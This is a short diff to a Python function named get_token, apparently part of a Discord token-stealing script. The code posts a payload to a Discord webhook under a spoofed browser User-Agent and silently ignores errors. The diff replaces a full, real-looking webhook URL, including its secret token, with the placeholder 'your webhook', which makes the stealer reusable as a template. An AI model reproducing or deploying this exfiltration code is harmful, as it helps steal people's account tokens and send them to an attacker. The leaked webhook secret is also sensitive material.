@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('https://discord.com/api/webhooks/1471495565614383104/uxov_jwx6Uezs_Q7N4-iya9aomWPVmGfMGOQEi46Lg2b_QaKOs1YZH0y7HXdbhVruj4C', data=payload.encode(), headers=headers2)
+                            req = Request('your webhook', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
